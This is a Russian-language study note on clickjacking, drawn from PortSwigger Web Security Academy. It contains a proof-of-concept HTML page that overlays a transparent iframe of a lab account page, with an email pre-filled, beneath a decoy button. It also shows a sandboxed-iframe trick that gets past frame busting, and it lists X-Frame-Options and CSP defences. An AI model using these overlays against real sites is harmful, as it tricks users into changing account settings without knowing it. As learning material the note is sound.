# Clickjacking (UI redressing)

Форма прорисовывается поверх формы лигитимного приложения. Разница от CSRF в том, что требуется от пользователя интерактивных действий (кликнуть по кнопке, например).

CSRF токены не защищают от этого вида атак. Защищает детектирование того, что сайт загружен в скрытом iframe.

Source: [https://portswigger.net/web-security/clickjacking](https://portswigger.net/web-security/clickjacking)

## Construct basic clickjacking attack

```markup
<html>
    <head>
        <title>UI Redressing PoC</title>
        <style>
            #target_website {
                position:relative;
                width:700px;
                height:500px;
                opacity:0.2;
                z-index:2;  /* Элемент с наиболее высоким z-index, перекрывает другие
                               Тем самым видимая часть (div) будет наверху, но фактически активным будет iframe
                            */
            }
            #decoy_website {
                position:absolute;
                z-index:1;
            }
            #btn_action {
                position: relative;
                width: 100px;
                height: 20px;
                color: brown; 
                top: 445px;  
                left: 40px;   
            }
        </style>
    </head>
    <body>
        <div id="decoy_website">
            <button id="btn_action">
                click me
            </button>
            ...decoy web content here...
        </div>
        <iframe id="target_website" src="https://0ac0003404fc3984c07807190024003a.web-security-academy.net/my-account?email=email2@gmail.com">
        </iframe>
    </body>
</html>
```

Через GET-параметры иногда можно добавлять значения по умолчанию в форму

Одна из Client-Side техник защиты от Clickjacking — Frame Busting. Однако это обходится в некоторых случаях.

Frame Busting реализуется с помощью проприетарных надстроек в браузере (через JS add-ons) или через такие расширения как NoScript. Скрипты реализуют следущее:

* проверить и обеспечить, чтобы текущее окно приложения было главным или верхним окном
* сделать все iframe видимыми
* предотвратить нажатие на невидимые frames
* перехватывать и помечать потенциальные кликджекинговые атаки для пользователя

Злоумышленник может это обойти, открывая iframe с атрибутами `allow-forms` или `allow-scripts` и опуская атрибут `allow-top-navigation`

```markup
<iframe id="victim_website" src="https://victim-website.com" sandbox="allow-forms"></iframe>
```

Значения `allow-forms` и `allow-scripts` разрешают указанные действия в iframe, но навигация верхнего уровня отключена. Это запрещает прерывание кадров, но обеспечивает функциональность на целевом сайте.

## Mitigations

### X-Frame-Options

Запрещено отрисовывать в iframe

```
X-Frame-Options: deny
```

Только с того же ориджена

```
X-Frame-Options: sameorigin
```

Разрешено с определенного сайта

```
X-Frame-Options: allow-from https://normal-website.com
```

### CSP

```
Content-Security-Policy: frame-ancestors 'self';
Content-Security-Policy: frame-ancestors normal-website.com;
```

Подробнее: [https://portswigger.net/web-security/cross-site-scripting/content-security-policy#protecting-against-clickjacking-using-csp](https://portswigger.net/web-security/cross-site-scripting/content-security-policy#protecting-against-clickjacking-using-csp)
